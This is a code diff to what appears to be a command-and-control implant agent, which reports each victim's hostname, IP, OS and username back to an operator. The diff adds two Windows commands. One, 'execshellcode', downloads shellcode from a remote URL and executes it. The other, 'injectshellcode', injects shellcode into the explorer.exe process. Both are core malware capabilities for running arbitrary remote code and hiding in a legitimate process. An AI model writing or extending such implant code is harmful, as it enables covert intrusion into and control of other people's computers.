@@ -31,6 +31,8 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.mv import mv
     from utils.winapi.cp import cp
     from utils.winapi.rm import rm
+    from utils.winapi.inject_shellcode import load_shellcode_into_explorer
+    from utils.winapi.load_shellcode_from_url import load_shellcode_from_url
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -198,6 +200,29 @@ def execute_commands():
                 try:
                     path = command_text.split(' ', 1)[1]
                     result = mkdir(path)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('execshellcode'):
+                try:
+                    file_url = command_text.split(' ', 1)[1]
+                    result = load_shellcode_from_url(file_url)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = f"{str(e)}"
+                    logging.error(output)  # Log the error for debugging
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('injectshellcode'):
+                try:
+                    file_path = command_text.split(' ', 1)[1]
+                    result = load_shellcode_into_explorer(file_path)
                     status = 'Completed'
                     output = result
                 except Exception as e:
